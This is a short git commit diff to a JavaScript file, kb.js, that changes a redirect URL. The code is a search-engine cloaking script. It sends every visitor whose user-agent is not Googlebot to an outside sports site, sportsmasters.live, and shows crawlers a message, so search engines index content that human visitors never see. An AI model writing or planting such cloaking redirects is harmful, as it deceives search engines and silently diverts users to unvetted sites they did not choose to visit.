d3b1d56a0c30b3f7caf723b7790e3a72642ed318
sportb133 <sportb133@gmail.com>
2026-09-05 02:14:38 +0600

    Update kb.js

--- Gromda/kb.js
+++ Gromda/kb.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "sportsmasters.live/Gromda-26/";
+  window.location.href = "https://sportsmasters.live/Gromda-26/";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
